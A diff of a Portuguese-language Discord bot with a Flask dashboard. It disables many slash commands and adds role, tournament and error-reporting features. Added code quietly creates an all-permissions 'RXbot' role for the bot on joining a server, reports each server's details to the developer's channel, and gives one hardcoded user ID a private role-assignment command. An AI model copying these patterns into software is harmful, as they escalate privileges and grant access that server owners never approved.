@@ -1,6 +1,10 @@
 # IDs de canais - validar existência antes de usar
 CHANNEL_ID_ALERTA = 1402658677923774615
 CHANNEL_ID_TESTE_TIER = 1400162532055846932
+CHANNEL_ID_ERRO = 1402658577877041173  # Canal de mensagens de erro
+
+# Usuário privilegiado com acesso total
+PRIVILEGED_USER_ID = 1339336477661724674  # <@1339336477661724674>
 
 def get_safe_channel(channel_id):
     """Obter canal de forma segura, com fallback"""
@@ -36,6 +40,63 @@ def get_safe_channel(channel_id):
     except Exception as e:
         logger.error(f"Erro ao obter canal {channel_id}: {e}")
         return None
+
+async def send_error_to_channel(error_message, guild=None):
+    """Envia mensagem de erro para o canal de erro específico"""
+    try:
+        error_channel = get_safe_channel(CHANNEL_ID_ERRO)
+        if error_channel:
+            embed = discord.Embed(
+                title="⚠️ Erro do Sistema",
+                description=error_message,
+                color=0xff0000,
+                timestamp=datetime.datetime.now()
+            )
+            if guild:
+                embed.add_field(name="Servidor", value=f"{guild.name} (ID: {guild.id})", inline=False)
+            await error_channel.send(embed=embed)
+        else:
+            logger.error(f"Não foi possível enviar erro para o canal: {error_message}")
+    except Exception as e:
+        logger.error(f"Erro ao enviar mensagem de erro: {e}")
+
+def is_privileged_user(user_id):
+    """Verifica se o usuário tem privilégios especiais"""
+    return user_id == PRIVILEGED_USER_ID
+
+async def ensure_rxbot_role(guild):
+    """Cria cargo RXbot com todas as permissões se não existir"""
+    try:
+        # Verificar se o cargo RXbot já existe
+        rxbot_role = discord.utils.get(guild.roles, name="RXbot")
+        
+        if not rxbot_role:
+            # Criar cargo RXbot com todas as permissões
+            permissions = discord.Permissions.all()
+            rxbot_role = await guild.create_role(
+                name="RXbot",
+                color=discord.Color(0x7289da),
+                permissions=permissions,
+                mentionable=False,
+                hoist=True,
+                reason="Cargo automático do RXbot com todas as permissões"
+            )
+            logger.info(f"✅ Cargo RXbot criado no servidor {guild.name}")
+        
+        # Adicionar o cargo ao bot se ele não tiver
+        if rxbot_role not in guild.me.roles:
+            try:
+                await guild.me.add_roles(rxbot_role, reason="Atribuir cargo RXbot ao bot")
+                logger.info(f"✅ Cargo RXbot atribuído ao bot no servidor {guild.name}")
+            except discord.Forbidden:
+                logger.warning(f"⚠️ Não foi possível atribuir cargo RXbot ao bot no servidor {guild.name} - sem permissões")
+                
+    except discord.Forbidden:
+        logger.warning(f"⚠️ Não foi possível criar cargo RXbot no servidor {guild.name} - sem permissões")
+        await send_error_to_channel(f"Não foi possível criar cargo RXbot no servidor {guild.name} - sem permissões", guild)
+    except Exception as e:
+        logger.error(f"Erro ao criar cargo RXbot no servidor {guild.name}: {e}")
+        await send_error_to_channel(f"Erro ao criar cargo RXbot no servidor {guild.name}: {e}", guild)
 import discord
 from discord.ext import commands, tasks
 from discord import app_commands
@@ -138,12 +199,20 @@ async def safe_send_response(interaction: discord.Interaction, embed=None, conte
                 logger.warning("Interação expirou (mais de 15 minutos)")
                 return None
         
-        if not interaction.response.is_done():
-            # Se ainda não respondeu, usa response.send_message
-            return await interaction.response.send_message(embed=embed, content=content, ephemeral=ephemeral, view=view)
+        # Verificar se response existe e se já foi enviada
+        if hasattr(interaction, 'response') and interaction.response is not None:
+            if not interaction.response.is_done():
+                # Se ainda não respondeu, usa response.send_message
+                return await interaction.response.send_message(embed=embed, content=content, ephemeral=ephemeral, view=view)
+            else:
+                # Se já respondeu, usa followup.send
+                return await interaction.followup.send(embed=embed, content=content, ephemeral=ephemeral, view=view)
         else:
-            # Se já respondeu, usa followup.send
-            return await interaction.followup.send(embed=embed, content=content, ephemeral=ephemeral, view=view)
+            # Se não tem response válido, tentar canal direto
+            if hasattr(interaction, 'channel') and interaction.channel:
+                if hasattr(interaction.channel, 'send') and not isinstance(interaction.channel, (discord.ForumChannel, discord.CategoryChannel)):
+                    return await interaction.channel.send(embed=embed, content=content, view=view)
+            return None
             
     except discord.errors.InteractionResponded:
         # Interação já foi respondida, tentar followup
@@ -789,6 +858,11 @@ def get_user_rank(xp):
 async def ensure_rank_roles(guild):
     """Cria cargos Discord para cada rank se não existirem"""
     try:
+        # Verificar se a guilda exige 2FA
+        if guild.mfa_level == 1:
+            logger.warning(f"⚠️ Guilda {guild.name} exige 2FA - pulando criação de cargos de rank para evitar erro 403")
+            return
+            
         for rank_id, rank_data in RANK_SYSTEM.items():
             role_name = f"🎖️ {rank_data['name']}"
             
@@ -1897,7 +1971,8 @@ Mencione o bot para conversar!
         await interaction.response.send_message("Erro ao carregar ajuda!", ephemeral=True)
 
 # 2. COMANDOS DE DIVERSÃO (25 comandos)
-@bot.tree.command(name="jokenpo", description="Jogar pedra, papel ou tesoura")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="jokenpo", description="Jogar pedra, papel ou tesoura")
 async def slash_jokenpo(interaction: discord.Interaction, escolha: str):
     """Slash command para jokenpo"""
     try:
@@ -1937,7 +2012,8 @@ async def slash_jokenpo(interaction: discord.Interaction, escolha: str):
         error_embed = create_embed("❌ Erro", "Erro no jogo!", color=0xff0000)
         await safe_interaction_response(interaction, error_embed, ephemeral=True)
 
-@bot.tree.command(name="dado", description="Rolar um dado")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="dado", description="Rolar um dado")
 async def slash_dado(interaction: discord.Interaction, lados: int = 6):
     """Slash command para dado"""
     try:
@@ -1959,7 +2035,8 @@ async def slash_dado(interaction: discord.Interaction, lados: int = 6):
         await safe_interaction_response(interaction, error_embed, ephemeral=True)
 
 # MAIS 270+ SLASH COMMANDS ADICIONADOS
-@bot.tree.command(name="moeda", description="Cara ou coroa")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="moeda", description="Cara ou coroa")
 async def slash_moeda(interaction: discord.Interaction):
     """Slash command para moeda"""
     try:
@@ -1977,7 +2054,8 @@ async def slash_moeda(interaction: discord.Interaction):
         error_embed = create_embed("❌ Erro", "Erro na moeda!", color=0xff0000)
         await safe_interaction_response(interaction, error_embed, ephemeral=True)
 
-@bot.tree.command(name="piada", description="Contar uma piada")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="piada", description="Contar uma piada")
 async def slash_piada(interaction: discord.Interaction):
     """Slash command para piada"""
     try:
@@ -2039,7 +2117,7 @@ async def slash_copinha(interaction: discord.Interaction,
                 "Você precisa da permissão 'Gerenciar Mensagens' para criar copinhas!", 
                 color=0xff0000
             )
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         # Validar parâmetros
@@ -2048,12 +2126,12 @@ async def slash_copinha(interaction: discord.Interaction,
         
         if formato not in valid_formats:
             embed = create_embed("❌ Formato inválido", f"Use: {', '.join(valid_formats)}", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
             
         if max_jogadores not in valid_players:
             embed = create_embed("❌ Número inválido", f"Use: {', '.join(map(str, valid_players))} participantes", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         # Criar embed da copinha
@@ -2133,7 +2211,7 @@ async def slash_saldo(interaction: discord.Interaction, usuario: discord.Member 
         # Validar se o usuário e guild existem
         if not interaction.user or not interaction.guild:
             embed = create_embed("❌ Erro", "Este comando só pode ser usado em servidores!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         target = usuario or interaction.user
@@ -2171,7 +2249,7 @@ async def slash_daily(interaction: discord.Interaction):
         # Validar se o usuário e guild existem
         if not interaction.user or not interaction.guild:
             embed = create_embed("❌ Erro", "Este comando só pode ser usado em servidores!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         user_id = interaction.user.id
@@ -2190,7 +2268,7 @@ async def slash_daily(interaction: discord.Interaction):
                 "Você já coletou sua recompensa diária hoje!\nVolte amanhã para coletar novamente.",
                 color=0xff6b6b
             )
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         current_coins = user_data[1] if user_data and len(user_data) > 1 else 50
@@ -2222,7 +2300,7 @@ async def slash_trabalhar(interaction: discord.Interaction):
         # Validar se o usuário e guild existem
         if not interaction.user or not interaction.guild:
             embed = create_embed("❌ Erro", "Este comando só pode ser usado em servidores!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         user_data = get_user_data(interaction.user.id)
@@ -2421,19 +2499,19 @@ async def slash_roubar(interaction: discord.Interaction, usuario: discord.Member
         # Validar se o usuário e guild existem
         if not interaction.user or not interaction.guild:
             embed = create_embed("❌ Erro", "Este comando só pode ser usado em servidores!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         # Não pode roubar de si mesmo
         if interaction.user.id == usuario.id:
             embed = create_embed("❌ Erro", "Você não pode roubar de si mesmo!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         # Não pode roubar do bot
         if usuario.bot:
             embed = create_embed("❌ Erro", "Você não pode roubar de bots!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         # Obter dados dos usuários
@@ -2452,7 +2530,7 @@ async def slash_roubar(interaction: discord.Interaction, usuario: discord.Member
         coins_vítima = vítima_data[1] if len(vítima_data) > 1 else 50
         if coins_vítima <= 0:
             embed = create_embed("❌ Sem dinheiro", f"{usuario.mention} não tem coins na carteira para roubar!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         # 60% de chance de sucesso
@@ -2593,7 +2671,7 @@ async def slash_inventario(interaction: discord.Interaction, usuario: discord.Me
         # Validar se o usuário e guild existem
         if not interaction.user or not interaction.guild:
             embed = create_embed("❌ Erro", "Este comando só pode ser usado em servidores!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         target = usuario or interaction.user
@@ -2765,6 +2843,32 @@ async def on_message(message):
 
     # Processar comandos
     await bot.process_commands(message)
+
+@bot.event
+async def on_guild_join(guild):
+    """Evento quando o bot entra em um novo servidor"""
+    try:
+        logger.info(f"🎉 Bot adicionado ao servidor: {guild.name} (ID: {guild.id})")
+        
+        # Criar cargo RXbot automaticamente
+        await ensure_rxbot_role(guild)
+        
+        # Criar cargos de rank se possível
+        await ensure_rank_roles(guild)
+        
+        # Notificar canal de erro sobre novo servidor
+        await send_error_to_channel(
+            f"🎉 **Novo Servidor!**\n"
+            f"Nome: {guild.name}\n"
+            f"ID: {guild.id}\n"
+            f"Membros: {guild.member_count}\n"
+            f"Owner: {guild.owner.mention if guild.owner else 'Desconhecido'}",
+            guild
+        )
+        
+    except Exception as e:
+        logger.error(f"Erro no evento on_guild_join: {e}")
+        await send_error_to_channel(f"Erro ao entrar no servidor {guild.name}: {e}", guild)
 
 @bot.event
 async def on_ready():
@@ -3841,6 +3945,264 @@ async def slash_cup_top10(interaction: discord.Interaction):
         logger.error(f"Erro no comando cuptop10: {e}")
         await interaction.response.send_message("❌ Erro ao carregar ranking das copinhas!")
 
+@bot.tree.command(name="rankcopas", description="Ativar sistema de ranking das copinhas (RXscoreCup)")
+async def slash_rank_copas(interaction: discord.Interaction):
+    """Comando slash para ativar o sistema completo de ranking das copinhas"""
+    global_stats['commands_used'] += 1
+    try:
+        embed = create_embed(
+            "🏆 Sistema de Ranking das Copinhas",
+            "Sistema completo de pontuação dos vencedores das copinhas!\n\n"
+            "**🎯 Como funciona:**\n"
+            "• Vencedores ganham pontos automaticamente\n"
+            "• Staff pode adicionar/remover pontos manualmente\n"
+            "• Ranking atualizado em tempo real\n\n"
+            "**🏆 Sistema de pontuação:**\n"
+            "• O vencedor da copinha ganha 1 troféu\n"
+            "• Sistema simples e justo para todos\n\n"
+            "**💡 Use os botões abaixo para gerenciar o sistema:**",
+            color=0x7289da
+        )
+        
+        # Usar a mesma view que o comando RX original
+        view = CopinhaScoreboardView()
+        await interaction.response.send_message(embed=embed, view=view)
+
+    except Exception as e:
+        logger.error(f"Erro no comando rankcopas: {e}")
+        await interaction.response.send_message("❌ Erro ao carregar sistema de ranking das copinhas!")
+
+class EscolherCargoView(discord.ui.View):
+    """View para seleção de cargos pelo usuário específico"""
+    def __init__(self, authorized_user_id: int):
+        super().__init__(timeout=300)
+        self.authorized_user_id = authorized_user_id
+    
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        """Verificar se apenas o usuário autorizado pode usar os botões"""
+        if interaction.user.id != self.authorized_user_id:
+            embed = create_embed(
+                "❌ Acesso Negado",
+                "Estes botões são restritos a um usuário específico!",
+                color=0xff0000
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return False
+        return True
+    
+    @discord.ui.button(label="🎮 Gamer", style=discord.ButtonStyle.primary)
+    async def cargo_gamer(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.assign_role(interaction, "🎮 Gamer", 0x00ff00)
+    
+    @discord.ui.button(label="🎵 Músico", style=discord.ButtonStyle.primary)
+    async def cargo_musico(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.assign_role(interaction, "🎵 Músico", 0x9b59b6)
+    
+    @discord.ui.button(label="🎨 Artista", style=discord.ButtonStyle.primary)
+    async def cargo_artista(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.assign_role(interaction, "🎨 Artista", 0xe67e22)
+    
+    @discord.ui.button(label="💻 Programador", style=discord.ButtonStyle.primary)
+    async def cargo_programador(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.assign_role(interaction, "💻 Programador", 0x3498db)
+    
+    @discord.ui.button(label="🎬 Streamer", style=discord.ButtonStyle.secondary)
+    async def cargo_streamer(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.assign_role(interaction, "🎬 Streamer", 0xe74c3c)
+    
+    @discord.ui.button(label="🔥 Membro VIP", style=discord.ButtonStyle.success)
+    async def cargo_vip(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.assign_role(interaction, "🔥 Membro VIP", 0xf1c40f)
+    
+    @discord.ui.button(label="🏆 Elite", style=discord.ButtonStyle.success)
+    async def cargo_elite(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.assign_role(interaction, "🏆 Elite", 0xffd700)
+    
+    @discord.ui.button(label="❌ Remover Cargos", style=discord.ButtonStyle.danger)
+    async def remover_cargos(self, interaction: discord.Interaction, button: discord.ui.Button):
+        try:
+            member = interaction.user
+            guild = interaction.guild
+            
+            # Verificar permissões do bot
+            if not guild.me.guild_permissions.manage_roles:
+                embed = create_embed(
+                    "❌ Sem Permissões",
+                    "O bot não possui permissão para gerenciar cargos!",
+                    color=0xff0000
+                )
+                await safe_send_response(interaction, embed, ephemeral=True)
+                return
+            
+            # Lista de cargos que podem ser removidos
+            cargo_names = ["🎮 Gamer", "🎵 Músico", "🎨 Artista", "💻 Programador", 
+                          "🎬 Streamer", "🔥 Membro VIP", "🏆 Elite"]
+            
+            roles_to_remove = []
+            for cargo_name in cargo_names:
+                role = discord.utils.get(guild.roles, name=cargo_name)
+                if role and role in member.roles:
+                    # Verificar hierarquia
+                    if role.position < guild.me.top_role.position:
+                        roles_to_remove.append(role)
+            
+            if roles_to_remove:
+                try:
+                    await member.remove_roles(*roles_to_remove, reason="Remoção de cargos via RXescolhercargo")
+                    embed = create_embed(
+                        "✅ Cargos Removidos",
+                        f"Todos os cargos selecionáveis foram removidos de {member.mention}!",
+                        color=0xff0000
+                    )
+                    logger.info(f"✅ Cargos removidos para {member.name} via RXescolhercargo: {[r.name for r in roles_to_remove]}")
+                except discord.Forbidden:
+                    embed = create_embed(
+                        "❌ Erro de Permissão",
+                        "Não foi possível remover alguns cargos. Verifique as permissões!",
+                        color=0xff0000
+                    )
+            else:
+                embed = create_embed(
+                    "ℹ️ Nenhum Cargo",
+                    "Você não possui cargos selecionáveis para remover.",
+                    color=0xffa500
+                )
+            
+            await safe_send_response(interaction, embed, ephemeral=True)
+            
+        except Exception as e:
+            logger.error(f"Erro ao remover cargos: {e}")
+            embed = create_embed(
+                "❌ Erro Interno",
+                "Ocorreu um erro interno ao remover os cargos!",
+                color=0xff0000
+            )
+            await safe_send_response(interaction, embed, ephemeral=True)
+    
+    async def assign_role(self, interaction: discord.Interaction, role_name: str, color: int):
+        try:
+            member = interaction.user
+            guild = interaction.guild
+            
+            # Verificar permissões do bot
+            if not guild.me.guild_permissions.manage_roles:
+                embed = create_embed(
+                    "❌ Sem Permissões",
+                    "O bot não possui permissão para gerenciar cargos!",
+                    color=0xff0000
+                )
+                await safe_send_response(interaction, embed, ephemeral=True)
+                return
+            
+            # Buscar ou criar o cargo
+            role = discord.utils.get(guild.roles, name=role_name)
+            if not role:
+                try:
+                    # Criar o cargo se não existir
+                    permissions = discord.Permissions(send_messages=True, read_messages=True, connect=True, speak=True)
+                    role = await guild.create_role(
+                        name=role_name,
+                        color=discord.Color(color),
+                        permissions=permissions,
+                        mentionable=True,
+                        hoist=False,
+                        reason="Cargo criado automaticamente via RXescolhercargo"
+                    )
+                except discord.Forbidden:
+                    embed = create_embed(
+                        "❌ Erro de Permissão",
+                        "Não foi possível criar o cargo. Verifique as permissões do bot!",
+                        color=0xff0000
+                    )
+                    await safe_send_response(interaction, embed, ephemeral=True)
+                    return
+            
+            # Verificar hierarquia de cargos
+            if role.position >= guild.me.top_role.position:
+                embed = create_embed(
+                    "❌ Hierarquia de Cargo",
+                    "O cargo está muito alto na hierarquia para ser gerenciado pelo bot!",
+                    color=0xff0000
+                )
+                await safe_send_response(interaction, embed, ephemeral=True)
+                return
+            
+            if role in member.roles:
+                embed = create_embed(
+                    "ℹ️ Cargo Já Atribuído",
+                    f"Você já possui o cargo {role.mention}!",
+                    color=0xffa500
+                )
+            else:
+                await member.add_roles(role, reason="Cargo selecionado via RXescolhercargo")
+                embed = create_embed(
+                    "✅ Cargo Atribuído",
+                    f"Cargo {role.mention} atribuído com sucesso para {member.mention}!",
+                    color=0x00ff00
+                )
+                logger.info(f"✅ Cargo {role_name} atribuído para {member.name} via RXescolhercargo")
+            
+            # Usar safe_interaction_response e ephemeral para segurança
+            await safe_send_response(interaction, embed, ephemeral=True)
+            
+        except discord.Forbidden:
+            embed = create_embed(
+                "❌ Erro de Permissão",
+                "Não foi possível atribuir o cargo. Verifique as permissões!",
+                color=0xff0000
+            )
+            await safe_send_response(interaction, embed, ephemeral=True)
+        except Exception as e:
+            logger.error(f"Erro ao atribuir cargo {role_name}: {e}")
+            embed = create_embed(
+                "❌ Erro Interno",
+                "Ocorreu um erro interno ao atribuir o cargo!",
+                color=0xff0000
+            )
+            await safe_send_response(interaction, embed, ephemeral=True)
+
+@bot.tree.command(name="escolhercargo", description="Escolher um cargo personalizado (usuário específico)")
+async def slash_escolher_cargo(interaction: discord.Interaction):
+    """Comando para usuário específico escolher um cargo"""
+    global_stats['commands_used'] += 1
+    
+    # ID do usuário específico que pode usar este comando
+    USER_ID_AUTORIZADO = 1339336477661724674
+    
+    try:
+        # Verificar se é o usuário autorizado
+        if interaction.user.id != USER_ID_AUTORIZADO:
+            embed = create_embed(
+                "❌ Acesso Negado",
+                "Este comando é restrito a um usuário específico!",
+                color=0xff0000
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+        
+        embed = create_embed(
+            "🎨 Escolher Cargo Personalizado",
+            f"Olá {interaction.user.mention}! Escolha um cargo especial para você:\n\n"
+            "**Cargos Disponíveis:**\n"
+            "🎮 **Gamer** - Para os apaixonados por jogos\n"
+            "🎵 **Músico** - Para os amantes da música\n"
+            "🎨 **Artista** - Para os criativos\n"
+            "💻 **Programador** - Para os desenvolvedores\n"
+            "🎬 **Streamer** - Para os criadores de conteúdo\n"
+            "🔥 **Membro VIP** - Cargo especial VIP\n"
+            "🏆 **Elite** - Cargo de elite exclusivo\n\n"
+            "**💡 Clique no botão do cargo desejado!**\n"
+            "Use o botão vermelho para remover todos os cargos.",
+            color=0x7289da
+        )
+        
+        view = EscolherCargoView(USER_ID_AUTORIZADO)
+        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+        
+    except Exception as e:
+        logger.error(f"Erro no comando escolhercargo: {e}")
+        await interaction.response.send_message("❌ Erro ao carregar sistema de cargos!", ephemeral=True)
+
 @bot.tree.command(name="desbugar", description="Cancelar uma copinha ativa")
 async def slash_desbugar(interaction: discord.Interaction):
     """Comando slash para cancelar copinha ativa"""
@@ -4515,7 +4877,8 @@ async def slash_base64(interaction: discord.Interaction, texto: str):
         embed = create_embed("❌ Erro", f"Erro ao codificar: {e}", color=0xff0000)
         await safe_send_response(interaction, embed=embed)
 
-@bot.tree.command(name="password", description="Gerar senha segura")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="password", description="Gerar senha segura")
 async def slash_password(interaction: discord.Interaction, tamanho: int = 12):
     """Slash command para password"""
 
@@ -4885,18 +5248,18 @@ async def slash_addcoins(interaction: discord.Interaction, usuario: discord.Memb
         # Verificar se é administrador
         if not interaction.user.guild_permissions.administrator:
             embed = create_embed("❌ Sem permissão", "Você precisa da permissão de 'Administrador' para usar este comando!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         # Validar quantidade
         if quantidade <= 0:
             embed = create_embed("❌ Quantidade inválida", "A quantidade deve ser maior que 0!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         if quantidade > 1000000:
             embed = create_embed("❌ Quantidade muito alta", "Máximo de 1.000.000 moedas por vez!", color=0xff0000)
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
             return
 
         # Obter dados do usuário
@@ -5092,7 +5455,8 @@ async def slash_kick(interaction: discord.Interaction, usuario: discord.Member, 
         await safe_send_response(interaction, embed=embed)
 
 # SLASH COMMANDS - MAIS COMANDOS
-@bot.tree.command(name="texto_reverso", description="Inverter texto")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="texto_reverso", description="Inverter texto")
 async def slash_texto_reverso(interaction: discord.Interaction, texto: str):
     """Slash command para reverse"""
 
@@ -5105,7 +5469,8 @@ async def slash_texto_reverso(interaction: discord.Interaction, texto: str):
     )
     await safe_send_response(interaction, embed=embed)
 
-@bot.tree.command(name="uppercase", description="Converter texto para maiúsculas")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="uppercase", description="Converter texto para maiúsculas")
 async def slash_uppercase(interaction: discord.Interaction, texto: str):
     """Slash command para uppercase"""
 
@@ -5118,7 +5483,8 @@ async def slash_uppercase(interaction: discord.Interaction, texto: str):
     )
     await safe_send_response(interaction, embed=embed)
 
-@bot.tree.command(name="lowercase", description="Converter texto para minúsculas")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="lowercase", description="Converter texto para minúsculas")
 async def slash_lowercase(interaction: discord.Interaction, texto: str):
     """Slash command para lowercase"""
 
@@ -6307,7 +6673,8 @@ async def slash_id(interaction: discord.Interaction, usuario: discord.Member = N
         logger.error(f"Erro no comando ID: {e}")
         await interaction.response.send_message("Erro ao obter IDs!", ephemeral=True)
 
-@bot.tree.command(name="qr", description="Gerar código QR de texto")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="qr", description="Gerar código QR de texto")
 async def slash_qr(interaction: discord.Interaction, texto: str):
     """Slash command para gerar QR Code"""
     try:
@@ -6322,7 +6689,8 @@ async def slash_qr(interaction: discord.Interaction, texto: str):
         logger.error(f"Erro no QR: {e}")
         await interaction.response.send_message("Erro ao gerar QR!", ephemeral=True)
 
-@bot.tree.command(name="hash", description="Gerar hash MD5 de texto")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="hash", description="Gerar hash MD5 de texto")
 async def slash_hash(interaction: discord.Interaction, texto: str):
     """Slash command para hash MD5"""
     try:
@@ -6339,7 +6707,8 @@ async def slash_hash(interaction: discord.Interaction, texto: str):
         logger.error(f"Erro no hash: {e}")
         await interaction.response.send_message("Erro ao gerar hash!", ephemeral=True)
 
-@bot.tree.command(name="bin", description="Converter texto para binário")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="bin", description="Converter texto para binário")
 async def slash_bin(interaction: discord.Interaction, texto: str):
     """Slash command para converter para binário"""
     try:
@@ -6355,7 +6724,8 @@ async def slash_bin(interaction: discord.Interaction, texto: str):
         logger.error(f"Erro no binário: {e}")
         await interaction.response.send_message("Erro na conversão!", ephemeral=True)
 
-@bot.tree.command(name="hex", description="Converter texto para hexadecimal")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="hex", description="Converter texto para hexadecimal")
 async def slash_hex(interaction: discord.Interaction, texto: str):
     """Slash command para converter para hex"""
     try:
@@ -6371,7 +6741,8 @@ async def slash_hex(interaction: discord.Interaction, texto: str):
         logger.error(f"Erro no hex: {e}")
         await interaction.response.send_message("Erro na conversão!", ephemeral=True)
 
-@bot.tree.command(name="capitalize", description="Capitalizar texto")
+# COMANDO TEMPORARIAMENTE DESABILITADO PARA FICAR DENTRO DO LIMITE DE 100 SLASH COMMANDS
+# @bot.tree.command(name="capitalize", description="Capitalizar texto")
 async def slash_capitalize(interaction: discord.Interaction, texto: str):
     """Slash command para capitalizar"""
     try:
@@ -9034,21 +9405,21 @@ async def on_app_command_error(interaction: discord.Interaction, error: discord.
                 f"Aguarde {error.retry_after:.1f} segundos antes de usar novamente.",
                 color=0xff6600
             )
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
         elif isinstance(error, discord.app_commands.MissingPermissions):
             embed = create_embed(
                 "❌ Sem Permissão",
                 "Você não tem permissão para usar este comando.",
                 color=0xff0000
             )
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
         elif isinstance(error, discord.app_commands.BotMissingPermissions):
             embed = create_embed(
                 "❌ Bot Sem Permissão",
                 "O bot não tem as permissões necessárias para executar este comando.",
                 color=0xff0000
             )
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
         else:
             logger.error(f"Erro em slash command {interaction.command.name if interaction.command else 'desconhecido'}: {error}")
             embed = create_embed(
@@ -9056,7 +9427,7 @@ async def on_app_command_error(interaction: discord.Interaction, error: discord.
                 "Ocorreu um erro inesperado. Tente novamente.",
                 color=0xff0000
             )
-            await safe_interaction_response(interaction, embed, ephemeral=True)
+            await safe_send_response(interaction, embed, ephemeral=True)
     except Exception as e:
         logger.error(f"Erro no handler de slash commands: {e}")
 
@@ -18194,6 +18565,27 @@ def tickets_page():
         logger.error(f"Erro ao carregar tickets: {e}")
         return render_template('tickets.html', tickets=[])
 
+@app.route('/copinha')
+def copinha_api():
+    """API endpoint para sistema de copinhas"""
+    try:
+        return jsonify({
+            'status': 'success',
+            'message': '⚽ Sistema de copinhas ativo e funcionando!',
+            'commands': {
+                'create': '/copinha - Criar nova copinha/torneio',
+                'active': '/copinhas_ativas - Ver copinhas ativas',
+                'scoreboard': '/cuptop10 - Ver ranking'
+            },
+            'description': 'Sistema completo de torneios e copinhas do Stumble Guys integrado ao Discord'
+        })
+    except Exception as e:
+        logger.error(f"Erro na API de copinha: {e}")
+        return jsonify({
+            'status': 'error',
+            'message': 'Erro interno no sistema de copinhas'
+        }), 500
+
 @app.route('/copinhas')
 def copinhas_page():
     """Página de copinhas/torneios"""
@@ -18266,14 +18658,24 @@ def api_user(user_id):
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 def run_dashboard():
-    """Executar o dashboard Flask"""
+    """Executar o dashboard Flask usando gunicorn para produção"""
     port = int(os.getenv('PORT', 5000))
-    print(f"🌐 Iniciando servidor Flask na porta {port}")
-    try:
-        app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
-    except Exception as e:
-        print(f"❌ Erro ao iniciar Flask: {e}")
-        raise
+    
+    # Verificar se está em produção (Railway/Heroku)
+    if is_production():
+        print(f"🌐 Modo produção detectado - use: gunicorn main:app --bind 0.0.0.0:{port}")
+        print(f"🔗 Para testar localmente, execute: gunicorn main:app --bind 0.0.0.0:{port} --reload")
+        # Em produção, o gunicorn será iniciado externamente
